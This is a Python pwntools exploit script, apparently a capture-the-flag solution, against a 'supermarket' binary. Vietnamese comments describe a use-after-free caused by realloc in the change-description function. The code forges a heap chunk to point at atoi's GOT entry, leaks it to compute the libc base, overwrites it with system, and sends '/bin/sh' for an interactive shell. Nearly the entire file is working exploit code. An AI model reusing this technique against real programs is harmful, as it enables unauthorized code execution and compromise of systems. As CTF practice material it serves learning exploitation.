from pwn import *

def start(argv = [], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


gdbscript = '''
init-pwndbg
b* 0x08048b08
b* 0x8048f7f
continue
'''.format(**locals())

#Binary filename
exe = './supermarket'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'

################################################################

p = start()
libc = ELF("./libc2.so.6")

'''
Lỗi bài này nằm ở hàm change_description với hàm realloc. Sau khi realloc chúng ta vẫn có thể dùng các space của phần description của chunk đó -> UseAfterFree
- Struct ham
{
    char name[16];
    int price;
    int size;
    char *des;
}
- các bước tiến hành:
+ Đầu tiên chúng ta tạo 1 chunk với phần size đủ lớn
+ change_des chunk nó nhỏ xuống
+ tạo chunk 2 với size nằm trong des chunk 1
+ change_des 1 fake chunk 2 với phần des trỏ tới GOT.atoi
+ leak tính libc.base
+ Thay GOT.atoi -> libc.system
+ nhập /bin/sh 
==> got Shell !!!  
'''

def add(name, price, size, des):
    p.sendlineafter(b"your choice>> ", "1")
    p.sendlineafter(b"name:", str(name))
    p.sendlineafter(b"price:", str(price))
    p.sendlineafter(b"descrip_size:", str(size))
    p.sendlineafter(b"description:", str(des))

def change(name, size, des):
    p.sendlineafter(b"your choice>> ", "5")
    p.sendlineafter(b"name:", str(name))
    p.sendlineafter(b"descrip_size:", str(size))
    p.sendlineafter(b"description:", (des))

def list():
    p.sendlineafter(b"your choice>> ", "3")
    p.recvuntil(b"des.")
    p.recvuntil(b"des.")
    return p.recv(4)
add("A", 9, 256, "chunk1")
change("A", 8, b"chunk1")
add("B", 8, 16, "chunk2")

payload = b"a" * 12         # useless filling in des chunk 1
payload += p32(0x21)        # chunk size (name + price + size)
payload += p32(0x42)        # name chunk 2
payload += b"b" * 12        # filling useless space in name chunk 2
payload += p32(0x8)         # price chunk 2
payload += p32(0x10)        # size chunk 2
payload += p32(elf.got.atoi)# atoi_got -> modify

change("A", 256, payload)

leak = u32(list())
log.info("leak = " + hex(leak))
libc.address = leak - libc.sym['atoi']
log.info("libc = " + hex(libc.address))

change("B", 16, p32(libc.sym["system"]))
p.sendlineafter(b"your choice>> ", "/bin/sh\x00")
p.interactive()
